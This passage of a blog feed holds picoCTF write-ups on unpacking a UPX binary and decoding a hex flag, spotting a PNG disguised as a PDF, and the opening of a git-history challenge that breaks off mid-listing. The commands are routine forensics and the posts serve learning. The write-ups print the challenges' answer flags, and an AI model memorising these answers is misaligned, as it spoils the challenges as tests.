</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>hello.php5  hello.png  leewookb.ovpn  out  shell.js
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>└─$ file out
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>out: ELF 64-bit LSB executable, x86-64, version <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux<span style="color:#89dceb;font-weight:bold">)</span>, statically linked, no section header</span></span></code></pre></div>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>I used the <code>strings</code> command to extract and print only the readable strings from the binary file and found these words that might be useful.</p>
<p><img src="image-1.png#center" alt="alt text"></p>
<p>It clearly mentions that the file is packed with the UPX executable. On the internet, I found the command to decompress the executable.</p>
<p><code>upx -d {your executable}</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ upx -d out -o original
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>                       Ultimate Packer <span style="color:#cba6f7">for</span> eXecutables
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>                          Copyright <span style="color:#89dceb;font-weight:bold">(</span>C<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">1996</span> - <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>UPX 4.2.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    Jan 3rd <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>        File size         Ratio      Format      Name
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>   --------------------   ------   -----------   -----------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> bad b_info at 0x4b710
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> ... recovery at 0x4b70c
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>    <span style="color:#fab387">877724</span> &lt;-    <span style="color:#fab387">336512</span>   38.34%   linux/amd64   original
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Unpacked <span style="color:#fab387">1</span> file.</span></span></code></pre></div>
<p>the <code>-o</code> option followed by <code>original</code> specifies that the unpacked file should be saved as <code>original</code>.</p>
<br>
<p>Now if you run the <code>strings original</code> command, the content is much more clear like the following:</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<p>However, the content is too large. I can&rsquo;t read everything line by line. Let&rsquo;s try if the content includes any flag by running the <strong>grep</strong> command.</p>
<p><code>strings original | grep &quot;flag&quot;</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ strings original | grep <span style="color:#a6e3a1">&#34;flag&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Password correct, please see flag: 7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f36666639363465667d
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">(</span>mode_flags &amp; PRINTF_FORTIFY<span style="color:#89dceb;font-weight:bold">)</span> !<span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>WARNING: Unsupported flag value<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span> of 0x%x in DT_FLAGS_1.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#f5e0dc">version</span> <span style="color:#89dceb;font-weight:bold">==</span> NULL <span style="color:#89dceb;font-weight:bold">||</span> !<span style="color:#89dceb;font-weight:bold">(</span>flags &amp; DL_LOOKUP_RETURN_NEWEST<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>flag.c
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>_dl_x86_hwcap_flags
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>_dl_stack_flags</span></span></code></pre></div>
<p>Notice that the second line displays some hex dump values. Let&rsquo;s try to convert that hex dump back to its original format.</p>
<p><code>xxd -r -p &lt;&lt;&lt; &quot;7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f36666639363465667d&quot;</code></p>
<p>Let&rsquo;s break down the command:</p>
<ul>
<li><code>xxd</code>: This is a command-line tool that creates a hex dump or converts a hex dump back to its binary form.</li>
<li><code>-r</code>: This option tells <code>xxd</code> to reverse the operation, meaning it will convert a hex dump back into its original binary form.</li>
<li><code>-p</code>: This option tells <code>xxd</code> to use a plain (continuous) hex dump format, without any additional formatting (like line numbers or spaces).</li>
<li><code>&lt;&lt;&lt;</code>: This is known as a <strong>here-string</strong> in bash. When you use the here-string, bash takes the string inside the quotes on the right and provides it as input to the command on its left.</li>
</ul>
<p>output:</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ xxd -r -p <span style="color:#89dceb;font-weight:bold">&lt;&lt;&lt;</span> <span style="color:#a6e3a1">&#34;7069636f4354467b5539585f556e5034636b314e365f42316e34526933535f36666639363465667d&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>U9X_UnP4ck1N6_B1n4Ri3S_6ff964ef<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p><strong><em>flag</em></strong>: <code>picoCTF{U9X_UnP4ck1N6_B1n4Ri3S_6ff964ef}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Secret of the Polyglot</title>
      <link>http://localhost:1313/picoctf-secret-of-the-polyglot/</link>
      <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-secret-of-the-polyglot/</guid>
      <description>Description The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&amp;rsquo;re getting conflicting information on what type of file it is. They&amp;rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file? Download the suspicious file.
First, I downloaded the provided file on my Kali Linux VM by the follwing command: wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf
The name of the file is flag2of2-final.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&rsquo;re getting conflicting information on what type of file it is. They&rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file?
Download the suspicious file.</p>
<hr>
<p>First, I downloaded the provided file on my Kali Linux VM by the follwing command:
<code>wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf</code></p>
<p>The name of the file is <code>flag2of2-final.pdf</code></p>
<p>I opened the file and it didn&rsquo;t have much information except some random strings, <code>1n_pn9_&amp;_pdf_7f9bccd1}</code></p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>I tried opening the file using the <code>nano</code> command in the terminal, hoping to see more information. When opened with nano, the top of the file stated <code>PNG</code> and included some non-human readable text. This made me suspect that the file is not a <code>PDF</code> but a <code>PNG</code> file.</p>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<p>The suspicion turned out to be true. The <code>file</code> command is used to determine the type of a file and the file was indeed a .png file.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file flag2of2-final.pdf
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>flag2of2-final.pdf: PNG image data, <span style="color:#fab387">50</span> x 50, 8-bit/color RGBA, non-interlaced</span></span></code></pre></div>
<br>
<p>So I created a new file by running the following command:
<code>cp flag2of2-final.pdf flag2.png</code></p>
<p>And check out the newly created file! We&rsquo;re really close to the capturing the flag.
<img src="image-2.png#center" alt="alt text"></p>
<p>We&rsquo;re missing the rest of the file but notice the name of the original file, <code>flag2of2-final.pdf</code>. The name implies that it is the second part of the flag.</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{f1u3n7*1n_pn9*&amp;\_pdf_7f9bccd1}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Time Machine</title>
      <link>http://localhost:1313/picoctf-time-machine/</link>
      <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-time-machine/</guid>
      <description>Description What was I last working on? I remember writing a note to help me remember&amp;hellip; You can download the challenge files here: challenge.zip
First, let&amp;rsquo;s download the provided .zip file on our terminal by running the following command:
wget https://artifacts.picoctf.net/c_titan/160/challenge.zip
1leewookb-picoctf@webshell:~$ ls 2README.txt challenge.zip Let&amp;rsquo;s unzip the downloaded file by running the following command:
unzip challenge.zip
1eewookb-picoctf@webshell:~$ unzip challenge.zip 2Archive: challenge.zip 3 creating: drop-in/ 4 inflating: drop-in/message.txt 5 creating: drop-in/.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>What was I last working on? I remember writing a note to help me remember&hellip;
You can download the challenge files here:
challenge.zip</p>
<hr>
<p>First, let&rsquo;s download the provided .zip file on our terminal by running the following command:</p>
<p><code>wget https://artifacts.picoctf.net/c_titan/160/challenge.zip</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>leewookb-picoctf@webshell:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>README.txt  challenge.zip</span></span></code></pre></div>
<p>Let&rsquo;s unzip the downloaded file by running the following command:</p>
<p><code>unzip challenge.zip</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>eewookb-picoctf@webshell:~$ unzip challenge.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Archive:  challenge.zip
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>   creating: drop-in/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>  inflating: drop-in/message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>   creating: drop-in/.git/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>   creating: drop-in/.git/branches/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  inflating: drop-in/.git/description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>   creating: drop-in/.git/hooks/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  inflating: drop-in/.git/hooks/applypatch-msg.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>  inflating: drop-in/.git/hooks/commit-msg.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  inflating: drop-in/.git/hooks/fsmonitor-watchman.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>  inflating: drop-in/.git/hooks/post-update.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>  inflating: drop-in/.git/hooks/pre-applypatch.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>  inflating: drop-in/.git/hooks/pre-commit.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>  inflating: drop-in/.git/hooks/pre-merge-commit.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>  inflating: drop-in/.git/hooks/pre-push.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>  inflating: drop-in/.git/hooks/pre-rebase.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>  inflating: drop-in/.git/hooks/pre-receive.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  inflating: drop-in/.git/hooks/prepare-commit-msg.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>  inflating: drop-in/.git/hooks/update.sample
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>   creating: drop-in/.git/info/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>  inflating: drop-in/.git/info/exclude
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>   creating: drop-in/.git/refs/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>   creating: drop-in/.git/refs/heads/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span> extracting: drop-in/.git/refs/heads/master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>   creating: drop-in/.git/refs/tags/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span> extracting: drop-in/.git/HEAD
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>  inflating: drop-in/.git/config
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>   creating: drop-in/.git/objects/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>   creating: drop-in/.git/objects/pack/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>   creating: drop-in/.git/objects/info/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>   creating: drop-in/.git/objects/43/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span> extracting: drop-in/.git/objects/43/246218ab4fc7b30e9a9dff073e012316851469
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>   creating: drop-in/.git/objects/25/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span> extracting: drop-in/.git/objects/25/16effb8d70e33bdd0023629b164a77225e1ec2
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>   creating: drop-in/.git/objects/89/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span> extracting: drop-in/.git/objects/89/d296ef533525a1378529be66b22d6a2c01e530
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>  inflating: drop-in/.git/index
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span> extracting: drop-in/.git/COMMIT_EDITMSG
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>   creating: drop-in/.git/logs/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>  inflating: drop-in/.git/logs/HEAD
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>   creating: drop-in/.git/logs/refs/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>   creating: drop-in/.git/logs/refs/heads/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>  inflating: drop-in/.git/logs/refs/heads/master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">45</span><span>leewookb-picoctf@webshell:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">46</span><span>README.txt  challenge.zip  drop-in</span></span></code></pre></div>
<br>
<p>Inside the drop-in folder, we have one file, <code>message.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>leewookb-picoctf@webshell:~$ <span style="color:#89dceb">cd</span> drop-in
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>leewookb-picoctf@webshell:~/drop-in$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>leewookb-picoctf@webshell:~/drop-in$ cat message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>This is what I was working on, but I<span style="color:#f38ba8">&#39;</span>d need to look at my commit <span style="color:#89dceb">history</span> to know why...</span></span></code></pre></div>
<br>
<p>The file didn&rsquo;t include the flag, we were looking for.
Let&rsquo;s run <code>ls -la</code> command to reveal all the hidden files.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>leewookb-picoctf@webshell:~/drop-in$ ls -la
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>total <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>drwxr-xr-x <span style="color:#fab387">3</span> leewookb-picoctf leewookb-picoctf  <span style="color:#fab387">37</span> Mar <span style="color:#fab387">12</span> 00:07 .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>drwxr-xr-x <span style="color:#fab387">4</span> leewookb-picoctf leewookb-picoctf <span style="color:#fab387">185</span> Jul  <span style="color:#fab387">7</span> 05:04 ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>drwxr-xr-x <span style="color:#fab387">8</span> leewookb-picoctf leewookb-picoctf <span style="color:#fab387">166</span> Mar <span style="color:#fab387">12</span> 00:07 .git
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>-rw-r--r-- <span style="color:#fab387">1</span> leewookb-picoctf leewookb-picoctf  <span style="color:#fab387">87</span> Mar <span style="color:#fab387">12</span> 00:07 message.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>leewookb-picoctf@webshell:~/drop-in$ <span style="color:#89dceb">cd</span> .git
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>leewookb-picoctf@webshell:~/drop-in/.git$ ls
